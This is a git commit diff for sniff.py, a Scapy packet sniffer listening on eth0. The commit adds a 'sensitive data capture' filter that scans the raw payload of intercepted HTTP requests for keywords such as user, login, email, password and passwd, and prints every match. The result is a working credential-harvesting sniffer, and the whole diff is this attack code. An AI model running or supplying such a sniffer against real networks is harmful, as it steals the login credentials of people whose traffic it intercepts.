2decc4098c1758a237bed3b7da51e4f64be848dc
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-23 02:42:04 -0400

    Added Filter for Sensitive data capture

--- sniff.py
+++ sniff.py
@@ -8,5 +8,14 @@ def see_packets(packet):
     if packet.haslayer(http.HTTPRequest):
         URL = "http://www." + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
         print(URL)
+        if packet.haslayer(scapy.Raw):
+            info = packet[scapy.Raw].load                     #uname&password sent in load filed in Raw layer
+            names = ["usernamr", "user", "login", "email", "uname", "password", "pass", "passwd"]
+            for word in names:
+                if word in info:
+                    print("\n###################\n")
+                    print(info)
+                    print("\n###################\n")
+                    break
 
 psniff("eth0")
